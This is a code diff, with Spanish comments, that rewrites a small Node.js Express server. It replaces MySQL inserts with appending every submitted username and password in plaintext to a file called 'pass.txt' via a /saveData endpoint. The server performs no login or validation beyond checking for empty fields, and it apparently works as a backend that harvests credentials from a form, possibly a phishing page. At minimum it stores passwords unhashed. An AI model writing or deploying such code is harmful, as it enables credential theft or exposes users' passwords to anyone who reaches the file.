@@ -1,63 +1,41 @@
-// Cargar las variables de entorno desde el archivo .env
-require('dotenv').config();
-
-// Importar las librerías necesarias
 const express = require('express');
-const mysql = require('mysql2');
-const cors = require('cors'); // Para permitir el acceso desde diferentes orígenes
+const fs = require('fs');
+const bodyParser = require('body-parser');
+require('dotenv').config();
 
 // Crear la aplicación Express
 const app = express();
+const port = process.env.PORT || 10000; // Asegúrate de que el puerto esté configurado correctamente
 
-// Middleware para manejar datos JSON y permitir CORS
-app.use(express.json());
-app.use(cors());
-
-// Crear la conexión a la base de datos usando las variables de entorno
-const connection = mysql.createConnection({
-  host: process.env.DB_HOST,
-  user: process.env.DB_USER,
-  password: process.env.DB_PASSWORD,
-  database: process.env.DB_NAME
-});
-
-// Conectar a la base de datos
-connection.connect((err) => {
-  if (err) {
-    console.error('Error al conectar a la base de datos:', err);
-    return;
-  }
-  console.log('Conexión exitosa a la base de datos');
-});
+// Middleware para parsear el cuerpo de las solicitudes como JSON
+app.use(bodyParser.json());
 
 // Ruta para recibir los datos del formulario
 app.post('/saveData', (req, res) => {
-  const { username, password } = req.body;
+    const { username, password } = req.body;
 
-  // Asegurarte de que los datos no están vacíos
-  if (!username || !password) {
-    return res.status(400).json({ message: 'Faltan datos' });
-  }
-
-  // Consulta para insertar los datos en la tabla 'users'
-  const query = 'INSERT INTO users (username, password) VALUES (?, ?)';
-  connection.query(query, [username, password], (err, result) => {
-    if (err) {
-      console.error('Error al insertar:', err);
-      return res.status(500).json({ message: 'Error al guardar los datos' });
+    // Asegúrate de que los datos no estén vacíos
+    if (!username || !password) {
+        return res.status(400).json({ message: 'Faltan datos' });
     }
-    res.json({ message: 'Datos guardados correctamente' });
-  });
+
+    // Crear el texto que se va a guardar en el archivo
+    const data = `Username: ${username}, Password: ${password}\n`;
+
+    // Escribir los datos en el archivo 'pass.txt'
+    fs.appendFile('pass.txt', data, (err) => {
+        if (err) {
+            console.error('Error al guardar los datos:', err);
+            return res.status(500).json({ message: 'Error al guardar los datos' });
+        }
+        console.log('Datos guardados correctamente');
+        res.json({ message: 'Datos guardados correctamente' });
+    });
 });
 
-// Ruta para verificar que el servidor esté funcionando
-app.get('/', (req, res) => {
-  res.send('Servidor funcionando');
+// Iniciar el servidor
+app.listen(port, () => {
+    console.log(`Servidor corriendo en http://localhost:${port}`);
 });
 
-// Puerto que usará el servidor (se configura automáticamente en Render)
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Servidor corriendo en http://localhost:${PORT}`);
-});
 
